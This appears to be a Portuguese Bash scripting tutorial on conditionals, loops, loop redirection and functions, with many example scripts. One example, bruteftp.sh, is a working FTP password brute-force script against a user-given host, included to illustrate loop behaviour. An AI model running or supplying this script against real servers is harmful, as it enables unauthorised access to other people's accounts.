+Eu, particularmente, prefiro usar esta estrutura quando vou fazer uma
+tomada de decisão e não preciso de "else".
+   A maneira de usar é:
+
+   comando1 && comando2
+   comando1 || comando2
+
+   O && executa o primeiro comando e somente se este retornar 0 (não
+ocorrer problemas) o segundo será executado.
+   O || executa o primeiro comando e somente se este retornar não-zero
+(ocorrer problemas) o segundo será executado.
+
+   Veja um exemplo bem simples:
+
+$ [ -d ~/tempdir ] || mkdir ~/tempdir
+
+  Como você deve estar lembrado, "[ -d ~/tempdir ]" é o mesmo que
+"test -d ~/tempdir" e retornará 0 se existir o diretório ~/tempdir. Caso
+não exista ele retornará 1, e neste caso o "mkdir ~/tempdir" será
+executado.
+
+   Vejamos um parecido usando o &&:
+
+$ [ -d ~/tempdir ] && ls -ld ~/tempdir
+
+   Não preciso explicar né?
+
+   Se você está se perguntando "Mas eu só vou poder usar um único
+comando?!", a próxima seção lhe trará respostas...
+
+
+4.3.1 Listas
+      ------
+
+   As listas de comandos servem para agrupar comandos (meio lógico, não?).
+Podem ser representadas por (parenteses) ou {chaves}. A diferença é que
+os (parenteses) executam os comandos numa shell a parte e as {chaves}
+executam no shell atual.
+   Execute comando a seguir e tente entendê-lo (está certo... são vários
+comandos, mas inicialmente é encarado com um comando só).
+
+/* -=-=-= exemplo =-=-=- */
+[ -d /usr/doc ] && {
+echo "O diretorio existe"
+echo "veja o seu conteudo"
+cd /usr/doc
+ls
+}
+/* -=-=-= exemplo =-=-=- */
+
+   E observe que ao final da execução você estará no diretório /usr/doc,
+o que comprova que com as {chaves} os comandos são executados no shell
+atual, se você trocar as {chaves} por (parênteses) observará que o seu
+diretório não se alterará.
+
+FYI: para saber o diretório atual o comando a ser usado é o "pwd".
+
+
+
+--------------------------------------------------------------------------
+
+
+
+5. Comandos de Loop
+   ****************
+
+   Isto é para quando você precisa repetir determinado comando, várias
+vezes.
+
+
+
+5.1. for
+     ===
+
+   O for funciona da seguinte forma:
+
+   for variavel-indice in lista-de-argumentos; do
+         <comandos que serão executados até que variavel-indice assuma
+         todos os valores da lista-de-argumentos>
+   done
+
+   A princípio você pode se sentir um pouco confuso com esse negócio de
+"lista-de-argumentos", assim como eu também fiquei, mas até que é fácil
+de entender. Funciona da seguinte forma: a variável usada como índice
+recebe todos os valores usados na lista de argumentos só que um de cada
+vez, quando não tiver mais argumentos o for acaba.
+   Vamos a um exemplo pra você entender direito:
+
+/* ----------------- */
+<++> BashScript/forsample1.sh
+#!/bin/bash
+
+# Exemplo (sem muita utilidade) do uso do comando "for"
+
+echo "Mostra o caminho inteiro de alguns comandos"
+for VAR in ls bc grep sed awk; do
+        which $VAR
+done
+<-->
+/* ----------------- */
+
+   Pois é! É meio esquisito, eu concordo! Mas é o que nós temos. :)
+Porém é raro a gente usar esta lista de argumentos deste jeito, passando
+todos os parâmetros "na mão". Uma maneira mais prática é assim:
+
+/* ----------------- */
+<++> BashScript/forsample2.sh
+#!/bin/bash
+
+if [ $# -lt 1 ]; then
+        echo "Uso: `basename $0` comando1 [comando2 [comandoN...]]" 1>&2
+        exit 1
+fi
+
+for VAR in $@; do
+        which $VAR
+done
+<-->
+/* ----------------- */
+
+
+   No exemplo acima, nós usamos no for os parâmetros passados na linha de
+comando. Existe uma outra maneira que poderíamos ter usado para o mesmo
+objetivo. Para isto basta omitirmos o "in lista-de-argumentos". Veja este
+exemplo:
+
+/* ----------------- */
+<++> BashScript/minuscula.sh
+#!/bin/bash
+# renomeia arquivos que tenham nome em maiusculas para
+# o equivalente em minusculas
+
+[ $# -lt 1 ] && {
+    echo "*** Erro: você precisa passar os arquivos que quer renomear"
+    echo "Uso: Mminusculas arquivo1 [arquivoN]"
+    exit
+}
+
+# repare que o for a seguir nao tem o "in lista-de-argumentos"!
+for maiuscula
+do
+    [ -e "$maiuscula" ] || {
+	echo "$maiuscula não existe, continuando com o próximo arquivo"
+	continue
+    }
+    minuscula=$( echo $maiuscula | tr A-Z a-z )
+    mv $maiuscula $minuscula
+done
+<-->
+/* ----------------- */
+
+
+   Agora para usarmos um for um pouco parecido com o das linguagens de
+programação convencionais usamos um comandinho chamado "seq". Ele
+funciona basicamente da seguinte forma:
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+$ seq 1 10
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+
+	# pode ser em ordem decrescente também:
+
+$ seq 10 1
+10
+9
+8
+7
+6
+5
+4
+3
+2
+1
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+   Fácil não? Agora vejamos um exemplo:
+
+/* ----------------- */
+<++> BashScript/tabuada.sh
+#!/bin/bash
+
+if [ $# -ne 1 ]; then
+    echo "Uso: `basename $0` n"
+    echo "Onde 'n' é um número inteiro qualquer"
+    exit 1
+fi
+
+for OP in `seq 1 10`; do
+  echo -e "$1 + $OP = $[ $1 + $OP ] \t $1 - $OP = $[ $1 - $OP ]"
+done
+
+echo
+
+for OP in `seq 1 10`; do
+  echo -e "$1 * $OP = $[ $1 * $OP ] \t \
+$1 / $OP = `echo "scale=2;$1 / $OP" | bc`"
+done
+<-->
+/* ----------------- */
+
+   Moleza! ;)
+
+
+5.1.1 "for" como na linguagem C
+      -------------------------
+
+   Se você já é programador C, pode tirar proveito da sintaxe do let (já
+explicado no ponto 4.1.2.). Para conferir isto basta pegar o script acima
+(tabuada.sh) e trocar as linhas onde tem
+
+for OP in `seq 1 10`; do
+
+por esta linha:
+
+for (( OP=1; OP <= 10; OP++ )); do
+
+Só não pode esquecer dos ((dois parênteses)).
+
+
+
+5.2. while
+     =====
+
+   Estrutura básica do while:
+
+   while <expressão>; do
+      <comandos que serão executados enquanto <expressão> retornar
+       verdadeiro>
+   done
+
+   Sem muita conversa. Vamos direto a um exemplo:
+
+/* ----------------- */
+<++> BashScript/whilesample.sh
+#!/bin/bash
+# Script que soma os números positivos que são dados e sai do programa
+# quando é entrado -1.
+
+RESULT=0
+NUM=0
+echo -e "\e[1mPara sair entre com '-1'.\e[m"
+while [ $NUM -ne -1 ]; do
+    echo -n "Número: "
+    read NUM
+    if [ $NUM -gt 0 ]; then
+        let RESULT+=$NUM
+        # para quem não conhece C: VAR1+=VAR2 é a mesma coisa que fazer
+        #                          VAR1=$[ $VAR1 + $VAR2 ]
+    fi
+done
+echo "Soma dos positivos: $RESULT"
+exit 0
+<-->
+/* ----------------- */
+
+
+
+5.3. until
+     =====
+
+   É igual ao while, exceto por um detalhezinho. Veja a expressão básica
+e saberá:
+
+   until <expressão>; do
+      <comandos que serão executados enquanto <expressão> retornar FALSO>
+   done
+
+   Leia direitinho: comandos que serão executados enquanto <expressão>
+retornar FALSO! ;-)
+
+   Exemplo:
+
+/* ----------------- */
+<++> BashScript/untilsample.sh
+#!/bin/bash
+
+CONT=10
+until [ $CONT -eq 0 ]; do
+        echo -ne "$CONT\t"
+        let CONT--
+done
+echo
+<-->
+/* ----------------- */
+
+
+
+5.4. break e continue
+     ================
+
+   Estes comandos são úteis quando usamos loops.
+
+
+--> break
+
+   Quebra a execução do loop. Para entender nada melhor que um exemplo:
+
+/* ----------------- */
+<++> BashScript/breaksample.sh
+#!/bin/bash
+
+# `true` sempre retorna verdadeiro
+while true; do
+	read -p "Tente adivinhar o número: " NUM
+	[ "$NUM" -eq 666 ] && break
+done
+
+echo -e "\nVocê acertou! \n"
+<-->
+/* ----------------- */
+
+   O que o break faz é pular a sequência de execução do script para o
+que vier depois do "done". Ele também aceita argumento, da seguinte
+forma: "break n", onde 'n' é um número inteiro que indica quantos
+"done's" pular.
+
+
+--> continue
+
+   O continue interrompe o loop e faz novamente o teste do comando que
+está controlando o loop (for, while, etc.). Veja este exemplo:
+
+/* ----------------- */
+<++> BashScript/concatenar.sh
+#!/bin/bash
+
+[ $1 ] || { echo "Entre com o(s) nome(s) do arquivo(s)"; exit 1; }
+
+for FILE in $@; do
+        [ -f $FILE ] || {
+                echo -e "\"$FILE\" não é um arquivo\n"
+                continue
+        }
+
+        cat $FILE >> AllFiles.txt
+        echo -e "\n\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n\n\n" >> AllFiles.txt
+
+done
+
+echo "Feito!"
+<-->
+/* ----------------- */
+
+   O que o continue faz é voltar lá para antes do "do" pra fazer o teste
+novamente. Ele também aceita argumento no estilo "continue n" para
+indicar quantos "do's" voltar.
+
+
+
+5.5 Redirecionando loops
+    ====================
+
+   Lendo o livro "Linux: Programação Shell" (ver Referências) eu aprendi
+umas formas de usar redirecionamento para loops. Vou tentar passar os
+esquemas aqui através de exemplos meramente ilustrativos. Vamos a eles,
+lembrando daqueles conceitos passados no tópico 3. (principalmente sobre
+o read e sobre os redirecionamentos).
+
+
+--> "pipeando" para o while
+
+   Vamos imaginar um arquivo onde eu tenho os nomes de alguns amigos meus
+e a região onde eles moram. Como alguns amigos moram em uma mesma região
+eu não vou ficar repetindo a região para cada um. Portanto o arquivo fica
+assim:
+
+<++> BashScript/amigos.regiao
+#############################
+# lista de amigos e estados #
+#############################
+#
+# OBS.: ISSO NÃO É UM SCRIPT!
+#
+# Linhas que COMEÇAM com '#' serão consideradas
+# comentários pelo script "listamigos.sh".
+#
+# Use da seguinte forma:
+# REGIAO        amigo1 amigo2 amigo3 amigoN ...
+#
+
+Nordeste        slater nashleon xf eSc2
+Sudeste         module hekodangews manalaura blindbard klogd
+Sul             evillord emmanuele
+
+<-->
+
+
+   Agora veja o script que usará as informações contidas no arquivo
+"amigos.regiao":
+
+/* ----------------- */
+<++> BashScript/listamigos.sh
+#!/bin/bash
+
+# o egrep abaixo vai pegar o arquivo "amigos.regiao"
+# sem exibir as linhas que comecem com um caractere '#'
+# (considerado comentário) e sem mostrar linhas vazias,
+# em seguida vai redirecionar a saída para a entrada do
+# read que está lá no while (relembre-se do read no
+# tópico 3.2.)
+egrep -v "^#|^ *$" amigos.regiao |
+while read REGIAO NOMES ; do
+	echo -e "\e[1m--> Amigos do $REGIAO:\e[m"
+	for amigo in $NOMES ; do
+		echo "$amigo"
+	done
+	echo
+done
+<-->
+/* ----------------- */
+
+   Deu pra sacar direitinho? Qualquer dúvida é só dar uma olhada nas man
+pages dos comandos que estão gerando as dúvidas.
+
+   Mas a coisa não é tão simples assim... Se dentro do loop você quisesse
+usar o comando read para ler do teclado, seria necessário pegar a entrada
+de "/dev/tty". Sabendo que o /dev/tty é o terminal que você está usando.
+   Se você tiver muitos amigos no arquivo "amigos.regiao" não vai
+conseguir ver todos, pois a lista não caberá numa tela só. Neste caso, o
+script a seguir será melhor que o "listamigos.sh".
+
+/* ----------------- */
+<++> BashScript/listamigos2.sh
+#!/bin/bash
+
+egrep -v "^#|^ *$" amigos.regiao |
+while read REGIAO NOMES ; do
+	echo -e "\n\e[32;1m--> Amigos do $REGIAO:\e[m"
+	for amigo in $NOMES ; do
+		echo -e "\e[1m$amigo\e[m"
+	done
+	echo -ne "\nEntre <ENTER> para continuar ou 'sair' para sair: "
+	read QUIT < /dev/tty
+	[ "$QUIT" = "sair" ] && exit
+done
+<-->
+/* ----------------- */
+
+   Se quiser comprovar com seus próprios olhos a necessidade de pegar a
+entrada de "/dev/tty" é só retirar o "< /dev/tty" naquele read dentro do
+loop.
+   OBS.: Curiosamente o exit dentro de um loop que recebe dados de um
+pipe funciona como se fosse um break. Pra comprovar isso coloque no final
+do script listamigos2.sh um "echo bla bla bla" e quando o script mostrar
+"Entre <ENTER> para continuar ou 'sair' para sair: " entre com 'sair'.
+   Isso ocorre porque durante o "pipeamento" os comandos são executados
+num subshell (um shell a parte ou shell filho, como preferir), e o exit
+faz sair deste subshell.
+
+   Vejamos um exemplo onde você verá que o exit funciona como o break:
+
+/* ----------------- */
+<++> BashScript/bruteftp.sh
+#!/bin/bash
+#
+##################################################################
+# ***********
+# * ATENÇÃO *
+# ***********
+# Não use este script para atacar servidores remotos! Ele deixará
+# arquivos de log imensos! Use-o apenas em localhost (127.0.0.1)
+# e veja você mesmo os rastros deixados nos arquivos de log.
+##################################################################
+#
+# Este código é só pra ilustração do texto
+# "Programação em Bourne-Agai Shell", OK?
+# Na prática mesmo ele não é muito útil.
+# Se quiser fazer um ataque de força bruta
+# mais eficiente faça em C.
+# Veja mais sobre ataques de força bruta em um
+# texto que o NashLeon fez em
+# <http://unsekurity.virtualave.net>
+#
+
+# verifica se o parâmetro passado é um arquivo
+[ -f "$1" ] || {
+	echo -e "\e[1mErro na passagem de parâmetros\e[m"
+	echo "Uso: `basename $0` wordlist"
+	exit 1
+}
+
+WL="$1"
+
+echo -e " \e[36;1m
+------------------------------- \e[37;1m
+ ataque de força bruta via ftp \e[36;1m
+------------------------------- \e[m
+"
+read -p "Host: " HOST
+read -p "Username: " USER
+
+cat $WL |
+while read PASS
+do
+    # 230 é o número que recebemos quando entramos com sucesso via ftp
+    ftp -ivn << EoF | grep "^230" &>/dev/null
+open $HOST
+user $USER $PASS
+bye
+EoF
+
+    # $? contém o código de retorno do grep
+    [ $? -eq 0 ] && {
+	echo -e "\n\e[36;5;1mO ataque foi bem sucedido! \e[m"
+	echo -e "Username: \e[1m$USER\e[m\nPassword: \e[1m$PASS\e[m"
+	exit 0
+	# lembrando que o exit funciona como se fosse break
+}
+
+done
+
+# $? contém o mesmo valor não-zero que fez parar o loop acima
+[ $? -ne 0 ] && echo "
+Você entupiu os arquivos de log por nada, pois o ataque fracassou...
+Mais sorte da próxima vez!
+"
+<-->
+/* ----------------- */
+
+   O "pipeamento" para while também é usado no Mextract.sh.
+
+
+
+--> redirecionando de arquivo para while
+
+   Esse método é bem esquisitinho... Mas vou colocar ele aí para quem
+quiser usar.
+
+   Agora veremos um arquivo onde eu tenho os telefones de alguns amigos.
+A disposição das informações dentro do arquivo é um pouco parecida com o
+"amigos.regiao", veja:
+
+<++> BashScript/agenda.tel
+#######################
+# Agenda de telefones #
+#######################
+#
+# OBS. I: ISSO NÃO É UM SCRIPT!
+# OBS. II: os números dos telefones deste
+#          arquivo são fictícios, não adianta
+#          que não vai dar pra sair passando
+#          trote... :-)
+#
+# Linhas que COMEÇAM com '#' serão consideradas
+# comentários pelo script "listartel.sh".
+#
+# Use da seguinte forma:
+# NOME	PREFIXO	TELEFONE
+# Com os campos separados por UM ÚNICO <TAB>.
+#
+# Exemplo:
+# lampiao	12	12345678
+# mariabonita	87	87654321
+
+# telefone "dus manu"
+xf	45	12431412
+slater	98	65451654
+minduin	45	54871800
+nash	23	65576784
+evil	23	54654654
+heko	43	56465465
+esc2	24	46456456
+
+# telefone "das mina"
+emmanuele	87	45646545
+maylline	29	65654655
+manalaura	82	65416578
+erika	65	34245522
+<-->
+
+
+   Vamos ao script que se utilizará das informações de "agenda.tel":
+
+/* ----------------- */
+<++> BashScript/listartel.sh
+#!/bin/bash
+TempFile=/tmp/TEMP-$$
+
+# o egrep abaixo vai mostrar o arquivo agenda.tel
+# sem exibir as linhas que comecem com um caractere '#'
+# (considerado comentário) e sem mostrar linhas vazias.
+# redirecionando a saída para $TempFile
+egrep -v "^#|^ *$" agenda.tel > $TempFile
+
+while read NOME PRE TEL ; do
+	echo -e "Tel de $NOME: ($PRE)$TEL"
+done < $TempFile
+# esse redirecionamento faz com o que o "read" lá no while
+# leia linha por linha do arquivo $TempFile
+
+rm $TempFile
+<-->
+/* ----------------- */
+
+
+   Agora quando você se sentir solitário e quiser conversar com alguém,
+basta fazer o seguinte:
+
+$ ./listartel.sh | grep emma
+
+   Aí é só você ligar pra emmanuele e bater um papo legal com ela. :)
+
+   OBS. I: Neste esquema também é necessário pegar os dados de /dev/tty
+se você quiser usar o read dentro do loop.
+   OBS. II: Se você usar exit dentro do loop usando este esquema, ele
+REALMENTE SAIRÁ DO SCRIPT. Não é igual ao esquema anterior onde o while
+recebe dados de um pipe e o exit funciona como se fosse um break. Então
+repetindo: neste esquema o exit funciona normalmente!
+
+
+
+--> redirecionando a saída do loop para a tela
+
+   Ficou confuso com este título? "Redirecionar a saída do loop para a
+tela parece ser uma coisa inútil, pois isso acontece todas as vezes." Aí
+que você se engana! Vamos ao exemplo onde eu mostrarei a utilidade de se
+redirecionar desta maneira...
+
+   Temos um script chamado retornatel.sh que pesquisa o telefone de um
+determinado amigo (o nome é passado ao script durante sua execução). Agora
+queremos pegar o telefone deste amigo e armazená-lo numa variável da
+seguinte maneira:
+
+FONE=`./retornatel.sh`
+
+   Só que, como veremos no script a seguir, a saída do script não é
+somente o número do telefone. Existe uma interface com o usuário
+perguntando qual o nome a ser pesquisado. Veja o script:
+
+/* ----------------- */
+<++> BashScript/retornatel.sh
+#!/bin/bash
+# tá bom, tá bom... eu sei que não é um exemplo muito útil...
+# é só pra ilustrar a utilidade de redirecionar a saída do loop
+
+FILE=agenda.tel
+
+function gotoxy {
+	[ $# -ne 2 ] && {
+		echo gotoxy: Erro na passagem de parâmetros
+		echo Uso: gotoxy X Y
+		exit 1
+	}
+	echo -ne "\e[$1;$2H"
+}
+
+while true; do
+	clear
+	gotoxy 5 1
+	read -p "Nome a ser pesquisado ('sair' para sair): " NOME
+	[ "X$NOME" = Xsair ] && exit
+	if grep "$NOME" $FILE &>/dev/null ; then
+		break
+	else
+		gotoxy 10 15
+		echo Nenhum $NOME foi encontrado em $FILE.
+		read -p "Pressione <ENTER> para continuar..."
+	fi
+done > /dev/tty
+
+grep "^$NOME" $FILE | cut -f3
+
+<-->
+/* ----------------- */
+
+   Olha o /dev/tty aí de novo! :P
+   Redirecionando a saída de todo o loop para "/dev/tty", fará com que os
+dados impressos para fazer a interface com o usuário não sejam enviados
+para a saída padrão e por conseguinte não sejam enviados para a variável
+que está recebendo o número através do método
+
+variavel=`programa`
+
+   Desta maneira, se você quer armazenar o telefone do xf na variável
+XFTEL, faça o seguinte:
+
+XFTEL=`./retornatel.sh`
+
+E então pesquise por xf. Depois é só usar
+
+echo $XFTEL
+
+para ver o telefone do cara.
+
+   Experimente usar o script sem este redirecionamento e pegar o telefone
+do xf desta maneira que expliquei para apreciar os resultados bizarros...
+
+
+
+-------------------------------------------------------------------------
+
+
+
+6. Funções
+   *******
+
+   Funções são interessantes para quando você precisa fazer uma
+determinada coisa várias vezes num mesmo script.
+   Uma função é como se fosse um script dentro do script, sendo assim ele
+também usa o mesmo esquema de parâmetros de um script comum ($1 para
+primeiro parâmetro, $2 para segunda, e todas aquelas regras explicadas em
+2.4. Parâmetros com a exceção do $0, que não retorna o nome da função!).
+Uma função também é capaz de retornar um valor usando o
+"return ValorDeRetorno", sendo que ValorDeRetorno ficará armazenado em
+"$?", vale observar também que só é possível retornar valores inteiros.
+Por exemplo, se na função tiver "return 123" depois da execução desta
+instrução "$?" valerá 123.
+   Bem... explicar com um código sempre é mais fácil! Se você acha que
+vai se safar do poderoso "Hello World" está muito enganado! Aí vai ele:
+
+/* ----------------- */
+<++> BashScript/hello.sh
+#!/bin/bash
+# "Hello World" usado para ilustrar o uso de funções.
+
+function quit {
+    echo -e "\e[1;32mTCHAU!\e[m"
+    exit
+}
+
+function e {
+    echo -e "\e[1;35m$1\e[m"
+}
+
+e Hello
+e World
+quit
+echo "Isso aqui não será impresso"
+<-->
+/* ----------------- */
+
+
+   Uhmmm... Sem falar muito eu já emendo outro código:
+
+
+/* ----------------- */
+<++> BashScript/maior.sh
+#!/bin/bash
+
+PARAM_ERR=-198 # Se for passado mais do que dois parâmetros.
+EQUAL=-199     # Retorno se os parâmetros forem iguais.
+
+function maior # Retorna o maior de dois números
+{              # OBS: os números comparados precisam ser menores que 257
+[ -z "$2" ] && return $PARAM_ERR
+
+if [ "$1" -eq "$2" ]; then
+    return $EQUAL
+elif [ "$1" -gt "$2" ]; then
+    return $1
+else
+    return $2
+fi
+}
+
+read -p "Numero-1: " N1
+read -p "Numero-2: " N2
+maior $N1 $N2
+RET_VAL=$?
+
+if [ $RET_VAL -eq $PARAM_ERR ]; then
+    echo "É necessário passar dois parâmetros para a função."
+elif [ $RET_VAL -eq $EQUAL ]; then
+    echo "Os dois números são iguais."
+else
+    echo "O maior número é $RET_VAL."
+fi
+
+
+exit 0
+<-->
+/* ----------------- */
+
+   Só umas informações adicionais:
+- O return quando executado interrompe a execução da função e a execução
+  passa para a instrução imediatamente posterior a qual a função foi
+  chamada;
+- O valor mais alto que uma função pode retornar é 256 e o mais baixo...
+  bem, é um número de módulo grande. :P Se precisar de valores positivos
+  maiores que 256 retorne-o como negativo e depois converta-o para
+  positivo novamente (como? ah meu amigo... saia da frente do computador
+  e vá procurar um livro de matemática!);
+- Se quer saber mais detalhes sobre funções o capítulo 23 do Advanced
+  Bash-Scripting Guide vai lhe ser muito útil.
+
+
+   Fique com mais este código que eu achei bem interessante. ;-)
+
+/* ----------------- */
+<++> BashScript/romano.sh
+#!/bin/bash
+#
+# Código baseado em um do Advanced Bash-Scripting Guide.
+# Mais informações sobre este guia em http://www.linuxdoc.org
+# Caso não entenda o código, faça um esforcinho! ;-)
+
+LIMITE=400
+
+function romano {
+    NUM=$1
+    FATOR=$2
+    ROMAN=$3
+
+    (( RESTO = $NUM - $FATOR ))
+
+    while [ "$RESTO" -ge 0 ]; do
+        echo -n $ROMAN
+        (( NUM -= $FATOR ))
+        (( RESTO = $NUM - $FATOR ))
+    done
+
+    return $NUM
+}
+
+[ "$1" ] || {
+    echo "Uso: `basename $0` NUMERO"
+    exit 1
+}
+
+[ "$1" -gt 400 ] && {
+    echo "$1 ultrapassa o limite de $LIMITE"
+    exit 1
+}
+
+NUMERO=$1
+
+romano $NUMERO 100 C
+NUMERO=$?
+
+romano $NUMERO 90 XC
+NUMERO=$?
+
+romano $NUMERO 50 L
+NUMERO=$?
+
+romano $NUMERO 40 XL
+NUMERO=$?
+
+romano $NUMERO 10 X
+NUMERO=$?
+
+romano $NUMERO 9 IX
+NUMERO=$?
+
+romano $NUMERO 5 V
+NUMERO=$?
+
+romano $NUMERO 4 IV
+NUMERO=$?
+
+romano $NUMERO 1 I
+NUMERO=$?
+
+echo
+
+exit
+<-->
+/* ----------------- */
+
+   Ah! Deixa eu dizer só mais uma coisinha: é possível declarar
+função(ões) dentro de função. Desta vez não darei exemplos, faça os
+testes por conta própria! :-)
+
+
+
+6.1 Funções como comandos
+    =====================
+
+   Antes de começar vamos relembrar um conceito básico: quando se executa
+um shell script você obtém o mesmo resultado que obteria se digitasse o
+conteúdo do script no prompt de um shell. Com isso eu quero dizer que você
+pode fazer tudo que faz em um shell script na linha de comando, inclusive
+criar e utilizar funções (que é o assunto deste tópico).
+   Bom chega de falar de coisas óbvias... :-)
+
+   Na linha de comando você declara uma função da mesma maneira que faz
+num script. Por exemplo, digite o seguinte na sua linha de comando:
+
+function heko {
+echo -e "\e[5;1;32mHekodangews, para de enrolar a mina e casa logo! \e[m"
+}
+
+   Agora quando você entrar com "heko" na linha de comando será impresso
+na tela um recadinho para o Hekodangews numa corzinha verde e piscante
+super-fashion. =)
+
+   Veja este outro exemplo um pouco mais útil:
+
+/* -=-=-= exemplo =-=-=- */
+function SetPath {
+PATH=${PATH:="/bin:/usr/bin"}
+for DIR in "$@"; do
+    if [ -d "$DIR" ]; then
+	PATH="$PATH:$DIR"
+    else
+	echo "* * * Erro: $DIR nao eh um diretorio"
+    fi
+done
+export PATH
+unset DIR
+}
+/* -=-=-= exemplo =-=-=- */
+
+   Acho que deu pra sacar qual é, né? Quando você quiser acrescentar algum
+diretório no seu PATH basta usar "SetPath dir1 dir2 dirn". ;-)
+
+   E se você tiver várias idéias de funções legais que queira usar sempre
+em suas sessões? Vai ter que digitá-las na linha de comando toda hora?
+Não! Para este propósito o comando "source" pode ser muito útil
+(informações detalhadas na manpage do bash).
+   Lembra-se de eu ficar enchendo o saco dizendo "Quando executamos um
+shellscript ele é executado num shell a parte (shell filho)"? Pois eu não
+fiquei enchendo o saco com isso sem motivo. O comando source faz com que
+o script seja executado no shell pai, ou seja, é como você estivesse
+digitando todo o conteúdo do arquivo na linha de comando. E isso é
+especialmente útil quando temos arquivos com as nossas funções que
+queremos usar como comandos.
+   Uma coisa legal de se fazer é colocar o arquivo com as funções que
+você quer usar num arquivo oculto no seu $HOME (ex.: $HOME/.MyFunctions)
+e no seu $HOME/.bash_profile você coloca uma linha com o comando
+"source $HOME/.MyFunctions".
+
+   Veja este arquivo com alguns exemplos de funções:
+
+/* ----------------- */
+<++> BashScript/bacanas/Mfunctions
+#!/bin/bash
+#
+# "INSTALAÇÃO":
+# copie este arquivo para seu $HOME:
+# [prompt]$ cp Mfunctions ~/.Mfunctions
+#
+# depois faça o seguinte:
+# [prompt]$ echo ". ~/.Mfunctions" >> ~/.bash_profile
+#
+# Dê login novamente ou digite ". ~/.Mfunctions" e pronto.
+# Agora é só digitar o nome da função.
+#
+# DICA: depois de corretamente instalada, use "M<tab><tab>"
+#	para ver as funções disponíveis.
+#
+# Funções disponíveis neste arquivo:
+# + Mecho
+# + Mcenter
+# + Mclock
+# + Mclock2
+# + Msetpath
+# + Mdica
+# + Marrumanome
+# + Mnocomments
+# + Mcalcula
+# + Mcores
+#
+# Aproveite!
+# meleu
+#
+# P.S.: graças a esse tal de "oupem sórssi" você pode ler
+#	um código e alterá-lo para que se adeque as suas
+#	necessidades eu que fique ao seu gosto. Pois foi
+#	isso que eu fiz aqui! Saí olhando as funções que
+#	outras pessoas fizeram e arrumei do meu jeito. E
+#	a minha principal fonte foi o funcoeszz do aurélio.
+#	veja em: http://verde666.org/zz
+#
+
+
+
+# imprime em negrito
+function Mecho {
+	echo -e "\e[1m$*\e[m"
+}
+
+
+
+# imprime em negrito no centro da linha
+function Mcenter {
+	local POS=$[ ( $COLUMNS - `echo -en "$*" | wc -c` ) / 2 ]
+	Mecho "\e[${POS}C$*"
+}
+
+
+
+# deixa sempre no cantinho da primeira linha do console:
+# "[ hora:minuto dia/mes/ano ]".
+# Se houver algum processo em segundo plano (background) ele também indica.
+# OBS.: nos emuladores de terminal em que eu testei só funcionou no xterm
+# o rxvt não aceita os códigos de salvar e restaurar a posição do cursor
+# (respectivamente "\e[s" e "\e[u").
+function Mclock {
+local CIANO="\e[1;36m"
+local AMARELO="\e[1;33m"
+local SCOR="\e[m"
+
+alias DiaMesAno='date +'\''%H:%M %e/%m/%y'\'
+
+PROMPT_COMMAND="
+JOBS=\$(echo \$(jobs | wc -l))
+if [ \$JOBS -ne 0 ]; then
+        HEADER=\"Jobs: \$JOBS     -     \$(DiaMesAno)\"
+else
+        HEADER=\"\$(DiaMesAno)\"
+fi
+POS=\$[ (\$COLUMNS - \$(echo \"\$HEADER\" | wc -c) ) - 3 ]"
+
+PS1="\[\e[s\e[1;0H\e[K\
+\e[\$(echo -n \$POS)C\
+$CIANO[$AMARELO \$HEADER $CIANO]$SCOR\
+\e[u\e[1A\]
+$PS1"
+
+echo -e "\nMclock ativado!\n"
+
+}
+
+
+
+# Parecido com o Mclock mas fica tudo escrito no centro da primeira linha
+# e em um formato mais longo.
+function Mclock2 {
+local CIANO="\e[1;36m"
+local AMARELO="\e[1;33m"
+local SCOR="\e[0m"
+
+alias Mdate='date +'\''%H:%M - %A, %e %B %Y'\'
+
+PROMPT_COMMAND="
+JOBS=\$(echo \$(jobs | wc -l))
+if [ \$JOBS -ne 0 ]; then
+        HEADER=\"Jobs: \$JOBS  -  $(Mdate)\"
+else
+        HEADER=\"\$(Mdate)\"
+fi
+POS=\$[ (\$COLUMNS - \$(echo \"\$HEADER\" | wc -c) ) / 2 ]"
+
+PS1="\[\e[s\e[1;0H\e[K\
+\e[\$(echo -n \$POS)C\
+$CIANO[$AMARELO \$HEADER $CIANO]$SCOR\
+\e[u\e[1A\]
+$PS1"
+
+echo -e "\nMclock2 ativado!\n"
+
+}
+
+
+
+# Adiciona um diretório na sua variável $PATH
+function Msetpath {
+local DIR
+PATH=${PATH:="/bin:/usr/bin"}
+[ $# -eq 0 ] && { echo "PATH = $PATH"; return; }
+for DIR in "$@"; do
+    if [ -d "$DIR" ]; then
+	PATH="$DIR:$PATH"
+    else
+	echo "* * * Erro: $DIR não é um diretório"
+	continue
+    fi
+done
+export PATH
+}
+
+
+
+# eu tenho no meu home um diretório dicas onde eu vou colocando
+# dicas sobre programas diversos.
+# o nome dos arquivos são iguais aos nomes dos programas, então
+# quando eu me deparo com uma dica sobre o grep, por exemplo, eu
+# faço:
+# [prompt]$ cat dica_grep >> ~/grep
+# esta função serve para visualizar as dicas
+# OBS.: o aurélio que me deu ESTA dica do diretório "$HOME/dicas".
+# valeu rapaz! ;)
+function Mdica {
+local DICASDIR=$HOME/dicas
+[ "$1" ] || {
+	Mecho "Uso: Mdica [assunto]\n"
+	echo "Os assuntos disponíveis são:"
+	ls $DICASDIR
+	return
+}
+
+more $DICASDIR/$1
+
+}
+
+
+
+# renomeia os arquivos que possuem nomes com caracteres feiosos
+# fazendo com que letras maiúsculas fiquem minúsculas;
+# letras acentuadas fiquem a letra correspondente sem acento;
+# e espaços em branco, símbolos e outras coisas feias fiquem
+# underline '_'
+function Marrumanome {
+[ "$1" ] || {
+	Mecho "Erro: você precisa passar os arquivos que quer renomear";
+	echo 'Uso: Marrumanome arquivo1 [arquivoN ...]'
+	return 1
+}
+
+local FILE NINICIAL NFINAL DIR
+
+for FILE in "$@"; do
+	[ -f "$FILE" ] || continue
+	NINICIAL=`basename "$FILE"`
+	DIR=`dirname "$FILE"`
+	NFINAL=`echo "$NINICIAL" | sed '
+y/ABCDEFGHIJKLMNOPQRSTUVWXYZ/abcdefghijklmnopqrstuvwxyz/
+y/ÃãÀàÂâÄäÁáÈèÊêËëÉé/aaaaaaaaaaeeeeeeee/
+y/ÌìÎîÏïÍíÕõÒòÔôÖöÓó/iiiiiiiioooooooooo/
+y/ÙùÛûÜüÚúÇçÑñ/uuuuuuuuccnn/
+s/^-/_/
+s/[^a-z0-9._-]/_/g'`
+
